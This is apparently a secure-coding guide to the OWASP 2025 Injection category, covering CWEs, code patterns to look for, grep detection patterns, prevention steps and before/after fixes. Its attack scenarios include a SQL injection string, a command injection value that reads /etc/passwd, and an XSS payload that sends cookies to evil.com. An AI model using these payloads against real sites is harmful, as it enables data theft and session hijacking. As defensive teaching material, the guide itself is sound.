# A05:2025 — Injection

## Overview

Injection is #5 in OWASP Top 10:2025 (down from #3). 100% of applications were tested for injection, and the category holds the highest CVE count at 62,445 across 37 CWEs. Injection occurs when untrusted user input is sent to an interpreter and executed as commands — including SQL, NoSQL, OS command, ORM, LDAP, and Expression Language injection. Cross-Site Scripting (XSS) is included in this category.

## Key CWEs

- **CWE-79**: Cross-site Scripting (XSS) — 30,000+ CVEs
- **CWE-89**: SQL Injection — 14,000+ CVEs
- **CWE-78**: OS Command Injection
- **CWE-20**: Improper Input Validation
- **CWE-94**: Improper Control of Generation of Code (Code Injection)
- **CWE-77**: Command Injection
- **CWE-74**: Injection (general)
- **CWE-917**: Expression Language Injection
- **CWE-1336**: Template Injection

## What to Look For

### SQL Injection
- String concatenation in SQL queries (instead of parameterized queries)
- Template literals embedding user input directly into SQL
- ORM methods with raw query options using unsanitized input
- Dynamic table/column names from user input

### Command Injection
- `exec()`, `spawn()`, `system()`, `popen()` with user-controlled arguments
- Shell command strings built with user input concatenation
- `child_process` usage with unsanitized input

### Cross-Site Scripting (XSS)
- `dangerouslySetInnerHTML` in React without sanitization
- `innerHTML`, `outerHTML`, `document.write()` with user data
- Template rendering of unsanitized user input
- URL parameters reflected into HTML without encoding

### Code Injection
- `eval()` with user-controlled input
- `Function()` constructor with user input
- `setTimeout`/`setInterval` with string arguments from user input
- Dynamic `import()` with user-controlled paths

### Server-Side Request Forgery (SSRF)
- HTTP requests where the URL is user-controlled
- URL parsing/fetching endpoints without allowlist validation
- Image/preview/proxy endpoints fetching arbitrary URLs

### Grep Patterns

```
# SQL injection
\+.*['"].*SELECT|SELECT.*\+.*req\.|SELECT.*\$\{|SELECT.*%s
\.query\(.*\+|\.execute\(.*\+|\.raw\(.*\+
f"SELECT|f"INSERT|f"UPDATE|f"DELETE

# Command injection
exec\(|execSync\(|spawn\(|spawnSync\(
child_process|subprocess|os\.system|os\.popen
Runtime\.getRuntime\(\)\.exec

# XSS
dangerouslySetInnerHTML|innerHTML|outerHTML|document\.write
v-html|ng-bind-html|\{\{\{.*\}\}\}

# Code injection
eval\(|Function\(|new Function|setTimeout\(.*req|setInterval\(.*req

# SSRF
fetch\(.*req\.|axios\(.*req\.|http\.get\(.*req\.|urllib.*req\.
request\.get\(.*user|requests\.get\(.*param
```

### JavaScript / TypeScript / Node.js
- Template literals in SQL: `` `SELECT * FROM users WHERE id = ${req.params.id}` ``
- `exec(command)` where command includes user input
- `dangerouslySetInnerHTML={{ __html: userContent }}`
- `eval(req.body.code)` or similar
- `fetch(req.query.url)` in preview/proxy endpoints

### Python (Django/Flask)
- `cursor.execute(f"SELECT ... {user_input}")` — use parameterized queries
- `os.system(f"command {user_input}")` — use subprocess with shell=False
- `eval(request.data)` or `exec(request.data)`
- Jinja2 `|safe` filter on user input

### Java (Spring)
- `Statement.executeQuery()` with concatenated SQL (use `PreparedStatement`)
- `Runtime.getRuntime().exec()` with user input
- JSP `<%= request.getParameter() %>` without encoding

## Prevention Measures

1. Use parameterized queries / prepared statements for ALL database access
2. Use safe APIs that avoid the interpreter entirely
3. Implement positive server-side input validation (allowlists)
4. Escape special characters using interpreter-specific syntax
5. Use LIMIT and other SQL controls to prevent mass disclosure
6. For XSS: use framework auto-escaping, CSP headers, sanitize HTML (DOMPurify)
7. For command injection: avoid shell execution entirely; use library functions
8. For SSRF: validate and allowlist URLs; block internal network ranges

## Example Attack Scenarios

**Scenario 1 — SQL Injection:**
```
https://example.com/search?q=' OR '1'='1
```
Query becomes: `SELECT * FROM items WHERE name = '' OR '1'='1'` — returns all records.

**Scenario 2 — Command Injection:**
```
https://example.com/export?file=report;cat /etc/passwd
```
Server executes: `convert report;cat /etc/passwd` — leaks system files.

**Scenario 3 — XSS:**
User stores `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` as content, which executes in other users' browsers.

## Fix Examples

**Before (SQL injection):**
```typescript
const query = `SELECT * FROM notes WHERE title LIKE '%${searchTerm}%'`;
const results = db.all(query);
```

**After (parameterized query):**
```typescript
const results = db.all(
  'SELECT * FROM notes WHERE title LIKE ?',
  [`%${searchTerm}%`]
);
```

**Before (command injection):**
```typescript
const { exec } = require('child_process');
exec(`convert ${req.query.filename} output.pdf`);
```

**After (safe alternative):**
```typescript
const { execFile } = require('child_process');
const safeName = path.basename(req.query.filename);
execFile('convert', [safeName, 'output.pdf']);
```

## References

- [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/)
- OWASP Cheat Sheet: Injection Prevention
- OWASP Cheat Sheet: SQL Injection Prevention
- OWASP Cheat Sheet: Query Parameterization
- OWASP Cheat Sheet: XSS Prevention
